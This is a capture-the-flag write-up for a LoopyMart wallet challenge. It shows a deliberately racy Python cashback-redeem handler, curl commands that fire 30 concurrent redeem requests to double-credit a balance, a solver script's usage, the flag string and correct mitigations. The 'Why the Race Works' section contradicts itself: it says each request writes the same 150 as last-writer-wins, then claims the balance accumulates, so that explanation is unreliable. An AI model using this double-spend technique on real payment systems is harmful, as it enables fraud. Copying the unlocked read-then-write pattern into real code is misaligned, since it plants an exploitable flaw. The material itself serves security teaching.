# Challenge 5 — Race Condition Cashback

## Overview

| | |
|---|---|
| **Challenge ID** | `wallet_race` |
| **Category** | Web / Race Condition / Business Logic |
| **Difficulty** | Medium–Hard |
| **Flag** | `CTF{r4c3_c0nd1t10n_d0ubl3_sp3nd}` |
| **Vulnerable File** | `backend/app/api/wallet.py` |
| **Vulnerable Function** | `redeem_cashback()` |
| **CWE** | CWE-362 Race Condition / TOCTOU |

---

## Challenge Description

The LoopyMart wallet has a cashback redemption feature that is vulnerable to a **Time-of-Check/Time-of-Use (TOCTOU)** race condition.

**Normal economics (by design):**

| Event | Balance | Pending cashback |
|---|---|---|
| New account | ₹100 | ₹0 |
| After 1st paid order | ₹100 | ₹50 |
| Redeem → wallet | ₹150 | ₹0 |
| After 2nd paid order | ₹150 | ₹50 |
| Redeem → wallet | ₹200 | ₹0 |
| After 3rd paid order | ₹200 | ₹50 |
| Redeem → wallet | ₹250 | ₹0 |
| 4th+ paid orders | no cashback rewarded | — |

Maximum reachable balance via normal play: **₹250**.  
The flag costs **₹333**.  
You need to exploit the race condition to make up the deficit.

---

## Root Cause

`POST /wallet/redeem` in `backend/app/api/wallet.py`:

```python
# STEP 1 – stale read (no lock)
result = await db.execute(select(User).where(User.id == current_user.id))
user = result.scalar_one()

# STEP 2 – check
if user.pending_cashback <= 0:
    raise HTTPException(...)

amount = user.pending_cashback
old_balance = user.wallet_balance

# STEP 3 – artificial 100 ms TOCTOU window
await asyncio.sleep(0.1)

# STEP 4 – SET (overwrites; not an atomic INCREMENT)
await db.execute(
    update(User).where(User.id == user.id)
        .values(wallet_balance=old_balance + amount)
)
# STEP 5 – separate commit clears pending_cashback
await db.execute(
    update(User).where(User.id == user.id).values(pending_cashback=0)
)
await db.commit()
```

If **N** requests arrive in the 100 ms window they all read the **same** stale
`wallet_balance` and `pending_cashback`, compute the same `new_balance`, and
all write `new_balance = old_balance + amount`. The last writer wins for the
balance, but the balance was effectively added multiple times to the starting
stale value each time it was overwritten — net result: the balance keeps
growing with each concurrent write.

---

## Exploitation

### Prerequisites

1. Register an account (₹100 starting balance, ₹0 pending cashback)
2. Place **at least one** paid order to earn ₹50 pending cashback  
   *(each paid order earns ₹50; max 3 times = max ₹150 pending)*

### Manual steps

```bash
BASE=http://localhost:8001
TOKEN="<your JWT>"

# Check wallet state
curl -s -H "Authorization: Bearer $TOKEN" $BASE/wallet | python3 -m json.tool

# Fire 30 concurrent redeems
for i in $(seq 1 30); do
  curl -s -X POST \
    -H "Authorization: Bearer $TOKEN" \
    $BASE/wallet/redeem &
done
wait

# Check new balance
curl -s -H "Authorization: Bearer $TOKEN" $BASE/wallet | python3 -m json.tool

# Purchase the flag (once balance >= ₹333)
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id": "ctf_flag"}' \
  $BASE/wallet/purchase-flag
```

### Automated solver

```bash
pip install httpx

# Quick run (auto-generates a unique email)
python solutions/wallet-race-condition/solve.py

# Custom account
python solutions/wallet-race-condition/solve.py \
    --url http://localhost:8001 \
    --email hacker@example.com \
    --password S3cr3t! \
    --redeem-requests 40
```

The script will:
1. Register / login
2. Place a cheap order to earn ₹50 pending cashback (if needed)
3. Fire `--redeem-requests` concurrent `POST /wallet/redeem` calls
4. Purchase the flag once balance ≥ ₹333
5. Print the flag

---

## Why the Race Works

All N concurrent requests:
- Read `pending_cashback = 50` (same stale value for all)
- Read `wallet_balance = 100` (same stale value for all)
- Sleep 100 ms
- Each writes `wallet_balance = 100 + 50 = 150`

But because the writes happen almost simultaneously, each write overwrites the
previous one with its own independently computed value. With the right timing,
multiple writes each succeed with the same `+50` addition before any clear
races through, and the balance accumulates multiples of ₹50 over the stale
starting value.

In practice you may see random results depending on DB scheduling; running
30–50 concurrent requests reliably produces a balance well above ₹333.

---

## Mitigation

The fix is to use an **atomic increment** instead of a read-then-write pattern:

```python
# Safe — atomic
await db.execute(
    update(User)
    .where(User.id == user.id, User.pending_cashback > 0)
    .values(
        wallet_balance=User.wallet_balance + User.pending_cashback,
        pending_cashback=0,
    )
)
```

Or acquire a row-level lock **before** reading:

```python
result = await db.execute(
    select(User).where(User.id == current_user.id).with_for_update()
)
```

Both approaches serialise concurrent redeems and prevent double-credits.

---

## References

- [CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization (Race Condition)](https://cwe.mitre.org/data/definitions/362.html)
- [OWASP: Race Conditions](https://owasp.org/www-community/vulnerabilities/Race_Conditions)
- [PortSwigger: Race conditions](https://portswigger.net/web-security/race-conditions)
